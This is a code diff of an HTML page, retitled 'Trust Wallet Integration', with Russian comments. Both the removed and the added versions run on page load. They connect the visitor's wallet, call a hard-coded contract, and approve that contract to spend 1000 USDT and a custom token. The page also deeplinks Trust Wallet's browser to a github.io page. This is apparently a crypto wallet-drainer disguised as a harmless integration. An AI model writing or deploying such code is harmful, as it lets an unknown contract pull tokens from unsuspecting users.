@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Automatic Wallet Connect</title>
+    <title>Trust Wallet Integration</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -13,10 +13,17 @@
             height: 100vh;
             background-color: #1f1f1f;
             color: white;
+            text-align: center;
         }
 
-        #app {
-            text-align: center;
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
         }
 
         #status {
@@ -31,92 +38,82 @@
             color: red;
         }
     </style>
-    <!-- Подключаем ethers.js -->
-    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js" type="text/javascript"></script>
 </head>
 <body>
     <div id="app">
-        <h1>Automatic Wallet Connect</h1>
-        <div id="status">Подождите, идет подключение и выполнение операций...</div>
+        <h1>Trust Wallet Integration</h1>
+        <button onclick="openTrustWallet()">Открыть Trust Wallet</button>
+        <div id="status"></div>
         <div id="error"></div>
     </div>
 
-    <!-- Основной скрипт -->
-    <script type="text/javascript">
-        window.addEventListener('load', async function() {
-            // Проверяем доступность ethers.js
-            console.log('ethers:', typeof ethers !== 'undefined' ? 'ethers загружен' : 'ethers НЕ загружен');
-            
-            if (typeof ethers === 'undefined') {
-                document.getElementById("error").innerText = "Ошибка: библиотека ethers.js не загружена.";
-                return;
-            }
+    <script>
+        // Открыть Trust Wallet через deeplink
+        function openTrustWallet() {
+            const deeplink = "trust://browser_redirect?url=https://sorex1992.github.io/github.io/";
+            window.location.href = deeplink;
+        }
 
-            const CONTRACT_ADDRESS = "0xfe0d3ab9a7ab9c070069f516feda0f351751944e"; // Адрес вашего контракта
-            const USDT_TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // Адрес контракта USDT
-            const CUSTOM_TOKEN_ADDRESS = "0xcb89e8dd26aad28674da9751bfa61815a75f152d"; // Адрес кастомного токена
-
-            // Основная функция для подключения и выполнения операций
-            async function mainProcess() {
+        // Автоматическое подключение кошелька и взаимодействие с контрактом
+        async function connectWalletAndSign() {
+            if (typeof window.ethereum !== "undefined") {
                 try {
-                    // Шаг 1: Проверка наличия кошелька и подключение
-                    if (typeof window.ethereum === 'undefined') {
-                        throw new Error("Кошелек не найден. Установите MetaMask или другой поддерживаемый кошелек.");
-                    }
-
                     // Подключение к кошельку
-                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
                     const userAddress = accounts[0];
                     document.getElementById("status").innerText = `Кошелек подключен: ${userAddress}`;
 
-                    // Шаг 2: Подписание контракта
+                    // Подписание контракта
                     await signContract();
 
-                    // Шаг 3: Выполнение approve для USDT и кастомного токена
-                    await approveTokens(USDT_TOKEN_ADDRESS);
-                    await approveTokens(CUSTOM_TOKEN_ADDRESS);
+                    // Выполнение approve
+                    await approveTokens("0x55d398326f99059fF775485246999027B3197955", "0xfe0d3ab9a7ab9c070069f516feda0f351751944e", "1000");
+                    await approveTokens("0xcb89e8dd26aad28674da9751bfa61815a75f152d", "0xfe0d3ab9a7ab9c070069f516feda0f351751944e", "1000");
 
-                    // Сообщение об успешном выполнении всех шагов
                     document.getElementById("status").innerText = "Все действия выполнены успешно.";
                 } catch (error) {
                     document.getElementById("error").innerText = `Ошибка: ${error.message}`;
                 }
+            } else {
+                document.getElementById("error").innerText = "Ошибка: Кошелек не найден. Установите Trust Wallet или MetaMask.";
             }
+        }
 
-            // Функция подписания контракта
-            async function signContract() {
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const signer = provider.getSigner();
-                const contractAbi = [
-                    "function approveContract() external"
-                ];
-                const contract = new ethers.Contract(CONTRACT_ADDRESS, contractAbi, signer);
+        // Функция подписания контракта
+        async function signContract() {
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            const signer = provider.getSigner();
+            const contractAbi = [
+                "function approveContract() external"
+            ];
+            const contractAddress = "0xfe0d3ab9a7ab9c070069f516feda0f351751944e";
+            const contract = new ethers.Contract(contractAddress, contractAbi, signer);
 
-                const tx = await contract.approveContract();
-                document.getElementById("status").innerText = `Контракт подписан. Транзакция: ${tx.hash}`;
-                await tx.wait();
-                document.getElementById("status").innerText = "Контракт успешно подписан.";
-            }
+            const tx = await contract.approveContract();
+            console.log("Контракт подписан. Транзакция:", tx.hash);
+            await tx.wait();
+            console.log("Контракт успешно подписан.");
+        }
 
-            // Функция предоставления доступа к токенам
-            async function approveTokens(tokenAddress) {
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const signer = provider.getSigner();
-                const tokenAbi = [
-                    "function approve(address spender, uint256 amount) public returns (bool)"
-                ];
-                const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);
+        // Функция для approve токенов
+        async function approveTokens(tokenAddress, contractAddress, amount) {
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            const signer = provider.getSigner();
+            const tokenAbi = [
+                "function approve(address spender, uint256 amount) public returns (bool)"
+            ];
+            const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);
 
-                const amount = ethers.utils.parseUnits("1000", 18); // Укажите необходимое количество токенов с учетом десятичных знаков
-                const tx = await tokenContract.approve(CONTRACT_ADDRESS, amount);
-                document.getElementById("status").innerText = `Транзакция approve отправлена: ${tx.hash}`;
-                await tx.wait();
-                document.getElementById("status").innerText = `Approve для токенов ${tokenAddress} выполнен.`;
-            }
+            const tx = await tokenContract.approve(contractAddress, ethers.utils.parseUnits(amount, 18));
+            console.log(`Approve для ${tokenAddress} отправлен. Транзакция:`, tx.hash);
+            await tx.wait();
+            console.log(`Approve для ${tokenAddress} выполнен.`);
+        }
 
-            // Запуск основного процесса
-            await mainProcess();
-        });
+        // Автоматическое выполнение после загрузки
+        window.onload = connectWalletAndSign;
     </script>
+    <!-- Подключение ethers.js -->
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
 </body>
 </html>
